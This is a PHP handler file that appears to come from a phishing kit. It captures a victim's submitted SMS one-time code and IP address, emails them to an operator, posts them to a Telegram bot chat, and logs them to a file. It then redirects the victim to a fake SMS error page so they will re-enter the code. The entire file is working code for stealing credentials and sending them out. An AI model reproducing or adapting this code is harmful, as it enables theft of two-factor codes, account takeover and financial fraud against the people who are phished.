<?php
session_start(); // Start the session
require '../config.php';
$Cashout = getenv("REMOTE_ADDR");

$logFile = 'logs.txt';
$logEntry = "---- OTPP2 ------\n";
$logEntry .= "SMS CODE: " . $_POST['sms'] . "\n";
$logEntry .= "-------------------------------\n";
$logEntry .= "IP: " .$Cashout. "\n";
$logEntry .= "------------------------------------------\n";
$logEntry .= "----- OTPP2 ------\n";
$logFile = 'logs.txt';
mail($email, "OTPP2", $logEntry);
$telegramApiUrl = "https://api.telegram.org/bot$botToken/sendMessage";
$data = [
    'chat_id' => $chatId,
    'text' => $logEntry
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $telegramApiUrl);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$response = curl_exec($ch);
curl_close($ch);



file_put_contents($logFile, $logEntry, FILE_APPEND);

function generateRandomString($length = 34) {
    return substr(str_shuffle(str_repeat('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length / 62))), 0, $length);
}

// Store the random string in the session
$_SESSION['random_string'] = generateRandomString();
$randomNumber = $_SESSION['random_string'];
header("Location: ./sms_error.php?$randomNumber");
